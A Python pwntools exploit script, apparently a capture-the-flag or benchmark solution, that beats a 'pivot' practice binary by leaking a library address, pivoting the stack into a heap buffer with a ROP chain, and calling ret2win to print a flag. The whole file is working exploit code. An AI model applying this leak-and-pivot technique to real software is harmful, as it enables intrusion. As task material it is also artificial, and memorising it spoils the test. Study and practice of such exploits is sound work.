code:
import argparse
import os
import re
from pathlib import Path
from pwn import *

def run_exploit(binary_path, runtime_dir, elf):
    libpivot = ELF(str(runtime_dir / 'libpivot.so'), checksec=False)
    p = process([str(binary_path)])
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rax = 0x4009bb
    xchg_rsp_rax = 0x4009bd
    p.recvuntil(b'pivot: 0x')
    heap_addr = int(p.recvline().strip(), 16)
    chain1 = flat([pop_rdi, elf.got['foothold_function'], elf.plt['puts'], elf.symbols['pwnme']])
    p.sendafter(b'Send a ROP chain now and it will land there\n> ', chain1)
    pivot_offset = 0x28
    pivot_payload = b'A' * pivot_offset + flat([pop_rax, heap_addr, xchg_rsp_rax])
    p.sendafter(b'Now please send your stack smash\n> ', pivot_payload)
    p.recvuntil(b'Thank you!\n')
    leaked_foothold_raw = p.recvline().strip()
    leaked_foothold_addr = u64(leaked_foothold_raw.ljust(8, b'\x00'))
    libpivot_base = leaked_foothold_addr - libpivot.symbols['foothold_function']
    ret2win_addr = libpivot_base + libpivot.symbols['ret2win']
    chain2 = flat([ret2win_addr])
    p.sendafter(b'Send a ROP chain now and it will land there\n> ', chain2)
    p.sendafter(b'Now please send your stack smash\n> ', pivot_payload)
    flag = p.recvall()
    log.info('Flag: %s' % flag.decode().strip())

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('binary', nargs='?', default=None)
    parser.add_argument('--binary', dest='binary_flag', default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary or os.environ.get('TARGET_BINARY')
    if not binary:
        raise SystemExit('missing binary path')
    binary_path = Path(binary).resolve()
    runtime_dir = Path(os.environ.get('TARGET_RUNTIME_DIR', str(binary_path.parent))).resolve()
    context.binary = str(binary_path)
    context.arch = 'amd64'
    context.bits = 64
    context.log_level = 'info'
    elf = ELF(str(binary_path), checksec=False)
    run_exploit(binary_path, runtime_dir, elf)

if __name__ == '__main__':
    main()
success_conditions: Look for WIN / FLAG markers in target output.
